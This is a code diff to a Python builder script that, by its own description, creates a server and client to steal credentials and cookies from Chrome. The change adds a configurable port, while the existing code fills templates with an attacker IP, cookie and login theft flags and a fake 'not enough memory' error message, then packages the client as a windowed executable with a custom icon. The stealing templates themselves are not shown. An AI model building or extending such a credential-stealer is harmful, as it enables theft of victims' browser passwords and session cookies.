@@ -40,7 +40,7 @@ def create_executable(filename, icon, mode="windowed"):
     ])
 
 
-def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool="1", error_message="None", cookies=False, login=False):
+def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool="1", error_message="None", cookies=False, login=False, port=80):
     reset_folders()
     os.mkdir("build")
     temp_path = f"{template_dir}/{filename}"
@@ -54,6 +54,7 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
         content = content.replace("<<ERROR_MESSAGE>>", f"{error_message}")
         content = content.replace("<<COOKIES_BOOL>>", f"{cookies}")
         content = content.replace("<<LOGIN_BOOL>>", f"{login}")
+        content = content.replace("<<PORT>>", f"{port}")
         with open(build_path, "w") as f:
             f.write(content)
         create_executable(filename, icon)
@@ -69,7 +70,7 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
     return False
 
 
-def build_server(filename="server", icon="server.ico"):
+def build_server(filename="server", icon="server.ico", port=80):
     reset_folders()
     os.mkdir("build")
     temp_path = f"{template_dir}/{filename}"
@@ -78,6 +79,7 @@ def build_server(filename="server", icon="server.ico"):
     if os.path.exists(temp_path):
         with open(temp_path, "r") as f:
             content = f.read()
+        content = content.replace("<<PORT>>", f"{port}")
         with open(build_path, "w") as f:
             f.write(content)
         create_executable(filename, icon, mode="console")
@@ -113,12 +115,25 @@ def build_message(server, client):
             f"[+] Build was successful. The file(s) should be in the directory: {dist_dir}")
 
 
+def check_valid_port(port):
+    try:
+        port = int(port)
+        if 0 < port < 65535:
+            return port
+        raise argparse.ArgumentTypeError(
+            f"Port {port} is invalid. Please use numbers between 1 and 65534")
+    except ValueError:
+        raise ValueError(f"Port needs to be an integer")
+
+
 def parse_arguments():
     error_message = "There isn't enough memory to complete this action. Try using less data or closing other applications."
     parser = argparse.ArgumentParser(
         description='Creates a server and client to steal credentials and cookies from Chrome')
     parser.add_argument('--ip', metavar="IP", type=str, default="127.0.0.1",
                         help="IP address to connect to, or reverse dns. Default is 127.0.0.1")
+    parser.add_argument('--port', metavar="PORT", type=check_valid_port, default=80,
+                        help="Port to host the server, deafult is 80")
     parser.add_argument('--error', dest="error_bool",
                         action="store_true", default=False, help="Use this to enable the error message. Default is False")
     parser.add_argument('--message', metavar="Error Message",
@@ -144,14 +159,14 @@ def parse_arguments():
         args.cookies_bool = True
         args.login_bool = True
     if args.server and not args.client:
-        server = build_server()
+        server = build_server(port=args.port)
     elif args.client and not args.server:
         client = build_client(ip_address=args.ip, error_bool=args.error_bool,
-                              error_message=args.message, cookies=args.cookies_bool, login=args.login_bool)
+                              error_message=args.message, cookies=args.cookies_bool, login=args.login_bool, port=args.port)
     else:
-        server = build_server()
+        server = build_server(port=args.port)
         client = build_client(ip_address=args.ip, error_bool=args.error_bool,
-                              error_message=args.message, cookies=args.cookies_bool, login=args.login_bool)
+                              error_message=args.message, cookies=args.cookies_bool, login=args.login_bool, port=args.port)
     build_message(server, client)
 
 
